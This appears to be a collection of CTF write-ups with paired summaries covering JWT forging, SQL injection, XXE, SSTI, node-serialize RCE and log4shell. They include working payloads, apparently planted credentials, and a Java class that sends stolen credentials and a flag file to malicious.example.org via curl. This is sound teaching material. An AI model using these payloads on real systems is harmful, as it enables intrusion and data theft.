I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Additional details will be available after launching your challenge instance.
 
## Solution ##

After start of the instance picoCTF will provide you source code of the site and link to running instance.

Site has login screen:

![Screenshot of the login screen](1.jpg)

And main screen with books.

![Screenshot of the main screen](2.jpg)

 We can't access any of them except the first one.

Let's dive into code.

There are some files, that are interesting to us.

![Screenshot of the files](3.jpg)

Inside `JwtService.java` we can see all data, that JwtToken contain, the issuer and that `secretGenerator` gives the secret key. 

![Screenshot of the file](4.jpg)

And inside the `SecretGenerator.Java` we see this.

![Screenshot of the file](5.jpg)

So, now we know, that ""secret key"" is `1234`. We have all the information to encode and decode JWT tokens.

But we need a userId, so let's get back to the login screen.

Now, I'm using `Google chrome` - press F12, open `Network` tab and login with creds from picoCTF: user:`user`, pass:`user`

And we will get the JWT token for our user in the payload of the response:

![Screenshot of the network tab](6.jpg)

Copy it and go to the [this website](https://jwt.io/). Let's decode it like this:

![Screenshot of the jwt](7.jpg)

So, `userId` is `1`.

Now let's encode our JWT token with role `Admin`:

![Screenshot of the jwt](8.jpg)

Inside `controllers` directory we can find `UserController.java`, where we can see this endpoint:

![Screenshot of the src](9.jpg)

Now I will use Postman (because I'm lazy) and send some requests with new JWT to update our role and read the flag.

We need to create new user on the site, because we can't patch default user role.

We need to obtain users list.

First of all - put token into headers. 

![Screenshot of the postman](10.jpg)

Request:

![Screenshot of the postman](11.jpg)

Our id is `6`.

Now let's patch our role:

![Screenshot of the postman](12.jpg)

Now we are `Admin` - just login and read the flag:

![Screenshot of the postman](13.jpg)

![Screenshot of the postman](14.jpg)
","Description: ""BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!""

After start of the instance picoCTF will provide you source code of the site and link to running instance.

The site has a login screen and a main screen with books. We can't access any of them except the first one. Let's dive into the code.

There are some files, that are interesting to us. Inside `JwtService.java` we can see all data, that JwtToken contain, the issuer and that `secretGenerator` gives the secret key.
In `SecretGenerator.Java`, we found out that ""secret key"" is `1234`. We have all the information to encode and decode JWT tokens.

We need a userId, so let's go back to the login screen. Using Google Chrome, press F12, open `Network` tab and login with creds from picoCTF: user:`user`, pass:`user`.
We can get the JWT token for our user in the payload of the response. Copy it and go to `jwt.io` to decode it, revealing the `userId` as `1`.

Now let's encode our JWT token with role `Admin`. In the `controllers` directory, we can find `UserController.java`, which has an endpoint for updating user roles. We will use Postman to send some requests with the new JWT to update our role and read the flag.

First, we need to create a new user on the site because we can't patch the default user role. Next, we need to obtain the users list. Put the token into headers and send a request. Our id is `6`. Now let's patch our role.

Now that we are an `Admin`, just log in and read the flag.
"
"# More SQLi #
 
## Overview ##
 
200 points
 
Category: [Web Exploitation](../)
 
Tags : `#picoCTF 2023` `Web Exploitation` `sql`
 
## Description ##

Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
 
## Solution ##

After start of the instance picoCTF will provide you a link to running instance.

Site has login screen:

![Screenshot of the login screen](1.jpg)

If you type `user` username and `user` pass - you will get this message.

![Screenshot of the login screen](2.jpg)

So now we see the query for login request - it is obviously a hint for us, because when we know the query - we can easily get in with
 
 `'or 1=1;--` in `pass` field:

![Screenshot of the login screen](3.jpg)

Because the result query will be something like this:

 `SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'`

We can test some queries to find out, what DB is used, and with this query: 

`123' UNION SELECT 1, sqlite_version(), 3;--` 

we now know, that this site is using SQLite.

![Screenshot of the site](4.jpg)

Now we can just list all tables with this query 

`123' UNION SELECT name, sql, null from sqlite_master;--`

![Scrennshot of tables](5.jpg)

Here is the flag - let's get it.

`123' UNION SELECT flag, null, null from more_table;--`

![Screenshot of the flag](6.jpg)","Description: ""Can you find the flag on this website.""

Additional details will be available after launching your challenge instance.
 
After start of the instance picoCTF will provide you a link to running instance.

If you type `user` as the username and `user` as the password, you will get a message that reveals the query for the login request. Since we know the query, we can easily get in by entering `'or 1=1;--` in the `pass` field. This modifies the query to be something like:
[SQL query modified with 'or 1=1;--' for bypassing authentication]

We can test some queries to find out what database is used. By entering this query: `123' UNION SELECT 1, sqlite_version(), 3;--`, we now know that the site is using SQLite.

Now we can list all tables with this query: `123' UNION SELECT name, sql, null from sqlite_master;--`. We find the flag in the table named `more_table`.

To get the flag, we use this query:
[SQL query to retrieve flag from the 'more_table']
"
"# SOAP #
 
## Overview ##
 
100 points
 
Category: [Web Exploitation](../)
 
Tags : `#picoCTF 2023` `Web Exploitation` `XXE`
 
## Description ##

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
 
## Solution ##

After start of the instance picoCTF will provide you a link to running instance.

There is a site.

![Screenshot of the main screen](1.jpg)

We saw tag `XXE` -> `XML external entity` and also, when we inspect static resources (F12 -> Sources in Google Chrome) of the site, we saw this two files:

detailsCheck.js

![Screenshot of the js](2.jpg)

xmlDetailsCheckPayload.js

![Screenshot of the js](3.jpg)

So, now we know for sure, that it is XXE. 

Also in the index.html we saw the endpoint for the POST request:

![Screenshot of the index.html](4.jpg)

We need just to make POST request to the `<url_of_site>/data` with XML payload to get the flag.

Let's check the format for XML request. Just click button on the site and look the request format in `Network` tab:

![Screenshot of the debug tab](5.jpg)

Now just send `POST` request with our payload and obtain the flag:

![Screenshot of the flag](6.jpg)","Description: ""The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?""

Additional details will be available after launching your challenge instance. 

After start of the instance picoCTF will provide you a link to running instance.

There is a site.

We saw tag `XXE` -> `XML external entity` and also, when we inspect static resources (F12 -> Sources in Google Chrome) of the site, we saw this two files:
- detailsCheck.js
- xmlDetailsCheckPayload.js

So, now we know for sure, that it is XXE. 

Also in the index.html we saw the endpoint for the POST request:

We need just to make POST request to the `<url_of_site>/data` with XML payload to get the flag.

Let's check the format for XML request. Just click button on the site and look the request format in `Network` tab.

Now just send `POST` request with our payload and obtain the flag."
"# Billboard Mayhem

## The App
This execise contains 2 Flags. The first one is just finding the form (wow, complicated), the second seems to be hidden in environment variables.

![[app.png]]

As stated, it can upload TPL files (seems to be a file format for a marketing and CRM software https://www.act.com/resources/downloads/ and https://file.org/extension/tpl)?

## Research
First, I tried to upload a file with the `.tpl` extension an a random content I can identify. It triggers a  `POST` to `/upload.php` and then redirects with `302 Found` to the `/index.php`, where the file content is diplayed. I tried to reload the page but the file content is always diplayed so it is persistend. Uploading the file a second time changes the output. Uploading a different file changes the content again.

Then I tried to upload a valid PHP file, and here it starts to become interesting:

```php
<?php

echo ""<br><script>alert(window.location.href)</script>"";
```

Becomes:

```html
<!--?php

echo ""<br--><script>alert(window.location.href)</script>"";
```

```php
<?php

echo 1+1;

```

Becomes:

```html
<!--?php

echo 1+1;
</div-->
```

After some more experiments `<div class=""test"">{7*7}</div>` became `<div class=""test"">49</div>`, which means that there exists a SSTI (Server Side Template Injection).

The following payload reveals some usefull information:
```
<div class=""test"">{join('<br>', array_keys(getenv()))} <br>-<br> {join('<br>', getenv())}<br>Exposed files<br>{join(';', glob('*'))}</div>
```

```
HOSTNAME  
HOME  
PATH  
CHALLENGE_USER  
DEBIAN_FRONTEND  
EXPOSED_URL  
PWD  
-  
0eb55f8a28f4  
/var/www  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
Spikezz0xF69sh  
noninteractive  
https://64bcca024aabaf144162740a78807d83.challenge.hackazon.org  
/  
Exposed files  
advertisement.tpl;billboard.tpl;index.php;smarty-4.0.1;templates_c;upload.php;upload.tpl
```

After googleing the unknown file or folder `smarty-4.0.1` we find a PHP library with this name. A template engine. https://www.smarty.net/. 

Digging deeper, the `templates_c` folder reveals the following content:

```
templates_c/8adfbabda06f8aba0b4b1d80c38a9737372bc06b_0.file.billboard.tpl.php
templates_c/b313a41804d60e60e349bb7b8c613386fcae54d9_0.file.upload.tpl.php
templates_c/dc37bb02e243b748b086ec9c23e78188c36d4887_0.file.advertisement.tpl.php
```

The template files are accessible on the server and can be downloaded by calling their files. The source code if PHP can be leaked with the payload `<div class=""test"">{system('cat index.php')}</div>`. By accident, this revealed the flag.

Leaked code:

```html
<div class=""test""><!--?php
require('smarty-4.0.1/libs/Smarty.class.php');
$smarty = new Smarty;
$smarty--->disableSecurity();
$smarty-&gt;assign('flag', 'Congratulations, the flag is: CTF{example_flag}');
$smarty-&gt;display('billboard.tpl');
?&gt;
?&gt;</div>
```

## Alternative solution
The template engine seems to have some sort of environment variable which might be accessible.","This execise contains 2 Flags. The first one is just finding the form (wow, complicated), the second seems to be hidden in environment variables.

First, the author tried to upload a file with the `.tpl` extension and a random content they can identify. It triggers a `POST` to `/upload.php` and then redirects with `302 Found` to the `/index.php`, where the file content is displayed. They tried to reload the page, but the file content is always displayed, so it is persistent. Uploading the file a second time changes the output. Uploading a different file changes the content again.

Then the author tried to upload a valid PHP file, and here it starts to become interesting:
[PHP script: Display an alert with the current URL]
Becomes: `<!--?php echo ""<br--><script>alert(window.location.href)</script>"";`
[PHP script: Echo the result of 1+1]
Becomes: `<!--?php echo 1+1; </div-->`

In this writeup, the author experimented with uploading files to a PHP web application. They discovered that the uploaded content is persistent and displayed on the site. They also noticed that when uploading PHP code, the server modifies the output, converting PHP tags into HTML comments.

After some more experiments, the author found that `<div class=""test"">{7*7}</div>` became `<div class=""test"">49</div>`, which means that there exists a Server Side Template Injection (SSTI).

The following payload reveals some useful information:
[HTML payload: Displays environment variables and exposes files]

After analyzing the output, the author discovered the presence of the `smarty-4.0.1` PHP library, a template engine. They also found the `templates_c` folder containing some template files.

The template files are accessible on the server and can be downloaded by calling their file paths. The source code of PHP can be leaked with the payload:
[HTML payload: Executes a system command to display the contents of the `index.php` file]

By accident, this revealed the flag.

An alternative solution mentioned that the template engine might have some sort of environment variable that could be accessible.
"
"# Cloud Escalator part 1
## The App
Cloud Escalator shows just an image with ""Under Construction"" on the start page.

## Exploring content
First I explored the site by opening it with ZAP Proxy.

### Path /
Nothing

### Path /logout

### Path /login
There is a login form which can submit username and password. Login with `admin` `admin` is not possible and shows a `The username and/or password are not valid` message. There is a `Forgot password` link which goes to `/forgotpassword.html`

The passwords from the database do not seem to be crackable with Hashcat (not a top 1.000.000 password + no result after 7 character brute force).

SQL Injection does not seem to work.

### Path /forgotpassword.html
This site has some JavaScript which is does not work:

```javascript
function errorMessage() {
	var error = document.getElementById(""error"")
	if (isNaN(document.getElementById(""number"").value))
	{
			
		// Complete the connection to mysqldb escalator.c45luksaam7a.us-east-1.rds.amazonaws.com. Use credential allen:8%pZ-s^Z+P4d=h@P
		error.textContent = ""Under Construction""
		error.style.color = ""red""
	} else {
		error.textContent = ""Under Construction""
	}
}
```

Another thing to note except the database credentials is the `JSESSIONID` cookie.

Custom header `ETag: W/""1562-1656070092000""` also might be interesting (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag Spoiler: It is not).

Trying to submit a username from the database does not seem to do something.

### Path /admin
HTTP 404, shows an Apache Tomcat default HTTP 404 error.

### Path /dashboard
HTTP 404, shows an Apache Tomcat default HTTP 404 error.

### Database
Openening the database reveals some shemas:

- accounts
- config
- env
- innodb
- sys
- users

#### Database schema users
##### Table data
Reveals a Flag.

##### Table employees_login
Contains `Emp_id`, `User_name` and `Password`. The passwords are hashed with SHA1.

##### Table employees
Contains some personal data about the employees. `Email`s are all `@dummy.com` and `Date_of_Birth` is all `0000-00-00`.

#### Database schema env
##### Table git
Contains an OpenSSH private key.

#### Database schema config
##### Table aws_env
Contains:

- `user` =  `s3user1`
- `access_key` = `AKIAWSXCCGNYFS7NN2XU`
- `secret` = `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`

#### Database schema accounts
##### Table employees_account
Contains `Emp_id`, `Username`, `Account_number`

### Amazon S3
The crdentials in the `aws_env` table can be used to access an Amazon S3 bucket with. Download is possible with AWS CLI (after `aws configure`): 
`aws s3 cp s3://escalator-logger-armour/ ~/Dokumente/CTFs/Hack\ Holidays\ -\ Unlock\ the\ City\ 2022/Web/Cloud\ Escalator/s3 --recursive --include ""*""`

It contains a tomcat log. After analyzing it, I saw another flag:

`23-Jun-2022 12:50:31.561 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: CTF{example_flag}`

After some more analyzing, I stumbled on this suspicious line:

`23-Jun-2022 12:50:31.551 ERROR [main] unable to pull update from github.com/cloudhopper-sec/app.git`

The repository is not accessible on GitHub. However, the account exists.

### GitHub Repository
GitHub repository can be cloned with the command `bash core.sshCommand=""ssh -i ~/location/to/private_ssh_key""`

The SSH key is the one leaked from the database.

The repository contains the source code of the challenge including a Dockerfile.

### Apache Tomcat
The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious `PUT` of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).

I tried it but the server is not vulnerable and forbids  `PUT` requests.

## Code Review
The Java Servlet has `log4j` 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).

Looking at the code, `ProfileServlet.java` logs the content of a `debug` Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.

JNDI payload:
`Payload - ${jndi:ldap://172.17.0.1:2022/foo}`

base64 encoded (for Cookie):
`VGVzdCAtICR7am5kaTpsZGFwOi8vMTcyLjE3LjAuMToyMDIyL2Zvb30`

In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is `SHA256(username + password)`.  The Database credentials don't work.

Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.

## Exploiting log4j for the flag (after challange for testing)
(Note: I was to lazy to write a beautiful Java code)

```java
public class RcePayload {
    private static final String HOST = ""http://malicious.example.org"";

    public RcePayload() {
        try {
            Class cookieHandlerClass = Class.forName(""com.cloudEscalator.util.CookieHandler"");
            Field usernamField = cookieHandlerClass.getDeclaredField(""USERNAME"");
            usernamField.setAccessible(true);
            Field passwordField = cookieHandlerClass.getDeclaredField(""PASSWORD"");
            passwordField.setAccessible(true);

            String username = (String) usernamField.get(null);
            String password = (String) passwordField.get(null);

            System.out.println(String.format(""Username: %s Password: %s"", username, password));

            // Send username and password to malicious server
            String command = String.format(""curl --insecure %s/?username=%s&password=%s"", RcePayload.HOST, username, password);
            System.out.println(command);
            Process p = Runtime.getRuntime().exec(command);
            p.waitFor();
            
            InputStream errorStream = p.getErrorStream();

            BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            reader.close();


            // Send flag to malicious server
            File flagFile = new File(""/root/flag"");
            Scanner myReader = new Scanner(flagFile);
            String content = """";
            while (myReader.hasNextLine()) {
                line = myReader.nextLine();
                content += line + ""\n"";
            }
            myReader.close();

            String command2 = String.format(""curl --insecure %s/?flag=%s"", RcePayload.HOST, URLEncoder.encode(content, StandardCharsets.UTF_8.toString()));
            System.out.println(command2);
            Process p2 = Runtime.getRuntime().exec(command2);
            p2.waitFor();
            
            InputStream errorStream2 = p2.getErrorStream();

            BufferedReader reader2 = new BufferedReader(new InputStreamReader(errorStream2));
            String line2;
            while ((line2 = reader2.readLine()) != null) {
                System.out.println(line2);
            }

            reader2.close();
        } catch (Exception e) {
            e.printStackTrace(System.out);
        }
    }
}
```

","The website's homepage displays an ""Under Construction"" image.

## Exploring content

To explore the site, it was opened with ZAP Proxy.

At the root path `/`, there was nothing of interest.
The `/logout` and `/login` paths were also investigated.
The login path contained a form for submitting a username and password, but attempting to log in with `admin` as both the username and password was unsuccessful, displaying a message stating that the username and/or password were invalid.

A ""Forgot password"" link redirected to `/forgotpassword.html`.
This path has some JavaScript which is does not work:
[JavaScript snippet: Non-working error message function with commented database credentials]

The passwords from the database did not appear to be crackable with Hashcat, even after a 7-character brute force attempt.
SQL Injection seemed to be ineffective.

Other notable features of the page included the `JSESSIONID` cookie and a custom header `ETag`.
It seems to be interesting (reading on the MDN Web Docs). Spoiler: it is not.

Submitting a username from the database did not seem to have any effect.

Visiting the `/admin` and `/dashboard` paths resulted in HTTP 404 errors, displaying default Apache Tomcat error messages.

### Database

Upon examining the database, several schemas were discovered: `accounts`, `config`, `env`, `innodb`, `sys`, and `users`.

Within the `users` schema, the `data` table contained a flag. The `employees_login` table held `Emp_id`, `User_name`, and `Password` fields, with passwords hashed using SHA1. The `employees` table contained personal data about the employees, with all emails ending in `@dummy.com` and all birthdates set to `0000-00-00`.

In the `env` schema, the `git` table contained an OpenSSH private key.

The `config` schema's `aws_env` table held the following information: `user` as `s3user1`, `access_key` as `AKIAWSXCCGNYFS7NN2XU`, and `secret` as `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`.

Finally, within the `accounts` schema, the `employees_account` table listed `Emp_id`, `Username`, and `Account_number`.

### Amazon S3
The crdentials in the `aws_env` table can be used to access an Amazon S3 bucket with. Download is possible with AWS CLI (after `aws configure`): 
[aws command: Download the S3 bucket content]

It contains a tomcat log. After analyzing it, I saw another flag:
`23-Jun-2022 12:50:31.561 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: CTF{example_flag}`

After some more analyzing, I stumbled on this suspicious line:
`23-Jun-2022 12:50:31.551 ERROR [main] unable to pull update from github.com/cloudhopper-sec/app.git`

The repository is not accessible on GitHub. However, the account exists.

### GitHub Repository
GitHub repository can be cloned with the command:
[bash command: Set the custom SSH command to use the provided private SSH key when connecting to a remote server]

The SSH key is the one leaked from the database.

The repository contains the source code of the challenge including a Dockerfile.

### Apache Tomcat
The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious `PUT` of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).

I tried it but the server is not vulnerable and forbids `PUT` requests.

## Code Review
The Java Servlet has `log4j` 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).

Looking at the code, `ProfileServlet.java` logs the content of a `debug` Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.
[JNDI payload]
[base64 encoded cookie]

In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is `SHA256(username + password)`.  The Database credentials don't work.

Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.

## Exploiting log4j for the flag (after challenge for testing)
(Note: I was to lazy to write a beautiful Java code)
[Java code: RcePayload class that exploits log4j vulnerability, extracts credentials and flag, and sends them to a malicious server]
"
"# Hack Holidays Airlines
## The App
The app represents an airline website. You can

- Sign up with a username, password and airline ticket number
- Then sign in with the username and password
- After that, the flight info will be displayed as a static image (it does not seem to contain any usefull information though at first glance)

## Code Review
After downloading the offered code, I looked into the folder with the app. Some JavaScript files, our (fake) Flag (hurray! No guessing where I neet to search for) and the `package.json`. Ok, so I ran `npm install` aaaannnnd:

```bash
[~/ctf/challenge]$ npm install             

added 258 packages, and audited 259 packages in 17s

20 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.

Run `npm audit` for details.

[~/ctf/challenge]$ npm audit  
# npm audit report

node-serialize  *
Severity: critical
Code Execution through IIFE in node-serialize - https://github.com/advisories/GHSA-q4v7-4rhw-9hqm
No fix available
node_modules/node-serialize

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.
```

Wow, interesting! ""Code Execution through IIFE in node-serialize"", thats the description from the GitHub [security advisory](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm). Damn, 9.8/10, this must be something. But what the heck is ""IIFE""? Okay Google ... or just opening the directly linked Wikipedia article in the advisory saves few clicks.

- https://developer.mozilla.org/en-US/docs/Glossary/IIFE
- https://en.wikipedia.org/wiki/Immediately_invoked_function_expression

After reading the advisory, it is clear thet `unserialize()` is the dangerous function here. Okay, let's remember that for later!

Were were we? Ah yes, review of the code. Ooops, just forgot about that and thought about this IIFE thing. But I have to calm down, you cant run before learning to crawl! So lets open it in VS Code and take a look. **No wait, a better idea!** Let's start the app first and see it in action. So lets try `npm run start` and ... rjagsdfgkafg!!!

```
> web_she_realized_the_problem@1.0.0 start
> node .

node:events:505
      throw er; // Unhandled 'error' event
      ^

Error: listen EACCES: permission denied 0.0.0.0:80
    at Server.setupListenHandle [as _listen2] (node:net:1355:21)
    at listenInCluster (node:net:1420:12)
    at Server.listen (node:net:1508:7)
    at Function.listen (ctf/challenge/node_modules/express/lib/application.js:635:24)
    at Object.<anonymous> (ctf/challenge/index.js:39:5)
    at Module._compile (node:internal/modules/cjs/loader:1105:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1159:10)
    at Module.load (node:internal/modules/cjs/loader:981:32)
    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:77:12)
Emitted 'error' event on Server instance at:
    at emitErrorNT (node:net:1399:8)
    at processTicksAndRejections (node:internal/process/task_queues:83:21) {
  code: 'EACCES',
  errno: -13,
  syscall: 'listen',
  address: '0.0.0.0',
  port: 80
}
```

Yikes, it tried to open a priviliged port. Okay then let's try `npm run dev` (oh BTW, you can find scripts executed by the `npm run` command in the `scripts` section of the `package.json`). Ahh, failed again. So I looked into our `index.js` and spotted `const port = process.env.PORT || 80;`. Ah, makes sense, so the command would be `PORT=8080 npm run ...`. Yeahhhh, worked. Oh, and a new file named `storage.db` appeared in our directory. Okay, lets take a look at the app.

![[app1.png]]
Nothing special. So lets go on. Interested in what the database looks like? Me too. So let's see what database engine seemed to be used (guess it was SQLite), open `package.json` again and ... yes it is SQLite as the dependecies say. Ok let's open the file in ""DB Browser for SQLite"":

![[db_user_table.png]]

Ok, nothing special at first. Although the `id` is weird. Just a ... double as a varchar?? Yeah, let's don't ask why exactly and just continue by reviewing the source now.

Firs't, let's open the `routes folder` which contains:

- index.js
- login.js
- logout.js
- signup.js

Pretty clear what they do, no spaghetti code, yay! So let's open index and ...

```javascript
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');

module.exports = (app, globalConfig) => {
	app.use(cookieParser())

	app.get('/', function(req, res) {
		if (req.cookies.session) {
			authorized = true;

			var cookieValue = new Buffer(escape((req.cookies.session)), 'base64').toString();
			var userInfo = serialize.unserialize(cookieValue);

			if (userInfo.username) {
				res.render('index', { title: 'Home', username: userInfo.username , authorized: authorized});
			}
		} else {
			authorized = false;
			res.render('index', { title: 'Home', authorized: authorized });
		}
	});
};
```

Well, this was not what I expected. **RED ALERT!** `unserialize()`. So, the cookie is a serialized JS object which contains the user info. So if we control the cookie => BOOM! Remote Code execution. So let's see if we can execute a malicious payload ...

## Tried soloutions
First, let's try a basic Unserialize without Cookies and all that stuff. Just an additional javascript file with our tests:

```javascript
let serialize = require(""node-serialize"");

let serializedPayload = serialize.serialize({
	username: (function () {
		console.error(""a malicious payload was executed! H4CK3D!!!"");
	})()
});

console.log(serializedPayload);

let unserializedPayload = serialize.unserialize(serializedPayload);
```

And yeah, this works without a problem. So I can craft the malicious payload (at least I thought so).

The payload needs to read our flag file and return the result as the username, so that we can see it in our website. Remember, it's shown there already as ""Welcome xxx"".

```javascript
let serialize = require(""node-serialize"");

let payload = {
	username: (() => {
		let fs = require(""fs"");
		let flag = fs.readFileSync(""./flag"").toString(""utf-8"");
		console.log(flag);
		
		return flag;

	})()
};

let serializedPayload = serialize.serialize(payload);
console.log(serializedPayload);
let unserializedPayload = serialize.unserialize(serializedPayload);
```

Aaaand ... oh, I made a stupid mistake!

### Problems

#### Payload was executed BEFORE serialization
Yeah, as the heading says, the payload was not serialized there and only executed before serializing. I mean makes sense because the function is executed. So I experimented a bit and looked up documentation.

https://github.com/luin/serialize

Oh, this is how functions can be executed. The function is encoded into the string and then gets executed.

### Solution

```javascript
let serialize = require(""node-serialize"");

let payload = `{
	""username"": ""_$$ND_FUNC$$_function (){let fs = require('fs');let flag = fs.readFileSync('./flag').toString('utf-8');console.log('Flag is: ' + flag);return flag;}()""
}`;

let unserializedPayload = serialize.unserialize(payload);
console.log(unserializedPayload.username);

console.log(""Your payload cookie will be: "" + new Buffer(payload, ""utf-8"").toString(""base64""));
```

We can set the resulting payload shown in the console as our `session` Cookie:

![[exploit_dev_environment.png]]

## Attack real target
Attacking the sandbox gave me the flag without any problems

## Better solution (after solving)
```javascript
let serialize = require(""node-serialize"");

let payload = {
    ""username"": function () {
        let fs = require('fs');
        let flag = fs.readFileSync('./flag').toString('utf-8');
        console.log('Flag is: ' + flag);

        return flag;
    }
};
let serializedPayload = serialize.serialize(payload);
serializedPayload = serializedPayload.replace('}""}', '}()""}');
console.log(""Serialized payload: "" + serializedPayload + ""\n"");
let unserializedPayload = serialize.unserialize(serializedPayload);
console.log(unserializedPayload.username);

console.log(""Your payload cookie will be: "" + new Buffer.from(serializedPayload, ""utf-8"").toString(""base64""));
```

Can serialize the payload istself without hand crafting.","The app represents an airline website. You can
- Sign up with a username, password and airline ticket number
- Then sign in with the username and password
- After that, the flight info will be displayed as a static image (it does not seem to contain any usefull information though at first glance)

## Code Review
After downloading the offered code, I looked into the folder with the app. Some JavaScript files, our (fake) Flag (hurray! No guessing where I neet to search for) and the `package.json`. Ok, so I ran `npm install` and:
[bash command: Install npm packages and display audit report]

Wow, interesting! ""Code Execution through IIFE in node-serialize"", thats the description from the GitHub [security advisory](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm). Damn, 9.8/10, this must be something. But what the heck is ""IIFE""? Okay Google ... or just opening the directly linked Wikipedia article in the advisory saves few clicks.
- https://developer.mozilla.org/en-US/docs/Glossary/IIFE
- https://en.wikipedia.org/wiki/Immediately_invoked_function_expression
After reading the advisory, it is clear thet `unserialize()` is the dangerous function here. Okay, let's remember that for later!

Were were we? Ah yes, review of the code. Ooops, just forgot about that and thought about this IIFE thing. But I have to calm down, you cant run before learning to crawl! So lets open it in VS Code and take a look. **No wait, a better idea!** Let's start the app first and see it in action. So lets try `npm run start` and ... rjagsdfgkafg!!!
[Error log: Permission denied while trying to start the app]

Yikes, it tried to open a priviliged port. Okay then let's try `npm run dev` (oh BTW, you can find scripts executed by the `npm run` command in the `scripts` section of the `package.json`). Ahh, failed again. So I looked into our `index.js` and spotted `const port = process.env.PORT || 80;`. Ah, makes sense, so the command would be `PORT=8080 npm run ...`. Yeahhhh, worked. Oh, and a new file named `storage.db` appeared in our directory. Okay, lets take a look at the app.

Nothing special. So lets go on. Interested in what the database looks like? Me too. So let's see what database engine seemed to be used (guess it was SQLite), open `package.json` again and ... yes it is SQLite as the dependecies say. Ok let's open the file in ""DB Browser for SQLite"".

Ok, nothing special at first. Although the `id` is weird. Just a ... double as a varchar?? Yeah, let's don't ask why exactly and just continue by reviewing the source now.

Firs't, let's open the `routes folder` which contains:
- index.js
- login.js
- logout.js
- signup.js

Pretty clear what they do, no spaghetti code, yay! So let's open index and ...
[JavaScript code snippet: Import cookie-parser, escape-html, and node-serialize, and set up a route for handling the root path]

Well, this was not what I expected. **RED ALERT!** `unserialize()`. So, the cookie is a serialized JS object which contains the user info. So if we control the cookie => BOOM! Remote Code execution. So let's see if we can execute a malicious payload ...

## Tried soloutions
First, let's try a basic Unserialize without Cookies and all that stuff. Just an additional javascript file with our tests:
[JavaScript code: Test basic serialization and unserialization with a simple payload]

And yeah, this works without a problem. So I can craft the malicious payload (at least I thought so).

The payload needs to read our flag file and return the result as the username, so that we can see it in our website. Remember, it's shown there already as ""Welcome xxx"".
[JavaScript code: Create a payload that reads the flag file and returns it as a username]

Aaaand ... oh, I made a stupid mistake!

### Problems

#### Payload was executed BEFORE serialization
Yeah, as the heading says, the payload was not serialized there and only executed before serializing. I mean makes sense because the function is executed. So I experimented a bit and looked up documentation.
https://github.com/luin/serialize

Oh, this is how functions can be executed. The function is encoded into the string and then gets executed.

### Solution
[JavaScript code: Craft a serialized payload with a function that reads the flag file and returns it as a username]

We can set the resulting payload shown in the console as our `session` Cookie.

## Attack real target
Attacking the sandbox gave me the flag without any problems

## Better solution (after solving)
[JavaScript code: Create a serialized payload using node-serialize, then modify it and unserialize it to get the flag]

Can serialize the payload istself without hand crafting.
"
"# Are you the Admin?
## The App
The app is a page with a form which says ""Create user"". After entering a name and clicking on ""Ctrate"", it lists the created users with name and if they are admins.

The source code for the app is avaliable as a download for the challenge.

## Review
The app is a Node.js TypeScript app written with Next JS. The `auth.ts` file is the most interesting:
```typescript
export default async function handler(
    req: NextApiRequest,
    res: NextApiResponse
) {
    const body = req.body;
    await prisma.user.create({
        data: body,
    });
    
    return res.status(200).end();
}
```

It just seems to store the body object into the database which is also seen in the requests made to API endpoint: `{""username"":""our-username""}`.

The shema file `shema.prism` shows, that there is a field `isAdmin`:

```prism
model User {
  id       String  @id @default(uuid())
  username String
  isAdmin  Boolean @default(false)
}
```

By sending a custom request body where `isAdmin` is set to `true` we can reveal the flag.","The app is a page with a form which says ""Create user"". After entering a name and clicking on ""Ctrate"", it lists the created users with name and if they are admins.

The source code for the app is avaliable as a download for the challenge.

## Review
The app is a Node.js TypeScript app written with Next JS. The `auth.ts` file is the most interesting part. The code snippet shows that it simply stores the request body object into the database, as seen in the requests made to the API endpoint with the format `{""username"":""our-username""}`.

It just seems to store the body object into the database which is also seen in the requests made to API endpoint: `{""username"":""our-username""}`.

The shema file `shema.prism` shows, that there is a field `isAdmin` field in the `User` model, which is set to `false` by default.

By sending a custom request body where `isAdmin` is set to `true` we can reveal the flag.
"
"# Calendar
## The App
The website is a WordPresss site where some links are cickable and reveal 2 blog posts where you can comment (in one of them).

## Exploring
`?p=1` has a blog post page where you can comment. First, I tried to create a comment aaannnd ... nothing? Interestingly, the URL is now `http://01.linux.challenges.ctf.thefewchosen.com:51490/?p=1&unapproved=2&moderation-hash=11d64a466de22952e34eaae54f57abc3#comment-2`. Seems like comments need to be approved or something.

Then I tried XSS but it does not really seem to work. The `<script>` tags seem to be removed and sometimes the commen isn't even listed.

